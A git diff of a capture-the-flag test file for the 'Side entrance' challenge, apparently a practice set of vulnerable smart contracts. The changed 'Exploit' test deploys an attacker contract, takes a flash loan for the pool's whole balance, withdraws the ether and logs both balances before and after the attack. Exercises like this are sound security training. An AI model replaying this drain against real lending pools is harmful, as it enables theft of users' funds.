@@ -23,18 +23,35 @@ describe('[Challenge] Side entrance', function () {
 		expect(await ethers.provider.getBalance(this.pool.address)).to.equal(ETHER_IN_POOL)
 	})
 
-	/** CODE YOUR EXPLOIT HERE */
 	it('Exploit', async function () {
-		const SideEntranceAttack = await ethers.getContractFactory(
-			'SideEntranceAttack',
-			attacker
-		)
+		/** CODE YOUR EXPLOIT HERE */
+		// Deploy attacker contract
+		const SideEntranceAttack = await ethers.getContractFactory('SideEntranceAttack', attacker)
 		attackContract = await SideEntranceAttack.deploy(this.pool.address)
 
+		// Log before attack
+		console.log(
+			'POOL BALANCE BEFORE ATTACK: ',
+			String(await ethers.provider.getBalance(this.pool.address))
+		)
+		console.log(
+			'ATTACKER BALANCE BEFORE ATTACK : ',
+			String(await ethers.provider.getBalance(attacker.address))
+		)
+
+		// Attack
 		await attackContract.connect(attacker).executeFlashLoan(ETHER_IN_POOL)
 		await attackContract.connect(attacker).withdraw()
-		console.log('POOL: ', String(await ethers.provider.getBalance(this.pool.address)))
-		console.log('ATTACKER: ', String(await ethers.provider.getBalance(attacker.address)))
+
+		// Log after attack
+		console.log(
+			'POOL BALANCE AFTER ATTACK: ',
+			String(await ethers.provider.getBalance(this.pool.address))
+		)
+		console.log(
+			'ATTACKER BALANCE AFTER ATTACK : ',
+			String(await ethers.provider.getBalance(attacker.address))
+		)
 	})
 
 	after(async function () {
